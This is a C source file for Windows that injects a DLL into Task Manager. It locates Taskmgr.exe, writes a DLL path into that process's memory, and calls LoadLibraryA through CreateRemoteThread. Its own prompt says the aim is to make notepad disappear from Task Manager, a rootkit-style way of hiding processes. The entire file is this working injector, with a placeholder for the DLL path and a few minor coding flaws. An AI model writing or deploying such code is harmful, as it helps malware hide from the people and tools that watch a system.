#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <winternl.h>

DWORD FindProcessId(PWCHAR processname)
{
	NTSTATUS status;
	PVOID buffer;
	PSYSTEM_PROCESS_INFORMATION spi;
	DWORD pid;

	buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	spi = (PSYSTEM_PROCESS_INFORMATION)buffer;

	status = NtQuerySystemInformation(SystemProcessInformation, spi, 1024 * 1024, NULL);

	while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
	{
		if (wcsncmp(spi->ImageName.Buffer, processname, spi->ImageName.Length) == 0)
		{
			pid = spi->UniqueProcessId;
		}
		spi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)spi + spi->NextEntryOffset); // Calculate the address of the next entry.

	}

	return pid;
}


int main()
{
	printf("About to make notepad disappear from taskmgr. Procced? (Enter)");
	scanf("%0s");

	DWORD PID = FindProcessId(L"Taskmgr.exe");
	printf("pid of taskmgr found: %ld\n", PID);
	HANDLE hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); // handle to the victim process

	if (hVictimProcess == NULL)
	{
		printf("Error getting handle to process, %d", GetLastError());
		return 1;
	}

	SYSTEM_INFO sSysInfo;
	GetSystemInfo(&sSysInfo); // to get System pageSize (dwSize)

	LPVOID lpDataBaseAddressOfVictim = VirtualAllocEx(hVictimProcess, NULL, sSysInfo.dwPageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // base address

	if (lpDataBaseAddressOfVictim == NULL)
	{
		printf("Failed virtual alloc, %d", GetLastError());
		return 1;
	}

	char* dll_name_string =
		"PATH"; // change this to the path of the DLL
	size_t sz = strlen(dll_name_string) + 1;

	BOOL writeProcMemResult = WriteProcessMemory(hVictimProcess, lpDataBaseAddressOfVictim, (LPCVOID)dll_name_string, sz, NULL);

	if (writeProcMemResult == FALSE)
	{
		printf("Error with writing process memory, %d", GetLastError());
		return 1;
	}

	HMODULE hKernel32 = LoadLibraryA("Kernel32"); // the LoadLibraryA function is in the Kernel32 dll.

	if (hKernel32 == NULL)
	{
		printf("Error with loading Kernel32, %d", GetLastError());
		return 1;
	}

	FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA"); // get the LoadLibraryA function address.
	if (hKernel32 == NULL)
	{
		printf("Error with getting loadlibrary, %d", GetLastError());
		return 1;
	}

	HANDLE hInjectorThread = CreateRemoteThread(hVictimProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryA,
		lpDataBaseAddressOfVictim, NULL, NULL);

	if (hInjectorThread == NULL)
	{
		printf("Error with creating thread, %d", GetLastError());
		return 1;
	}

	printf("Done, dll injected.");

	return 0;
}
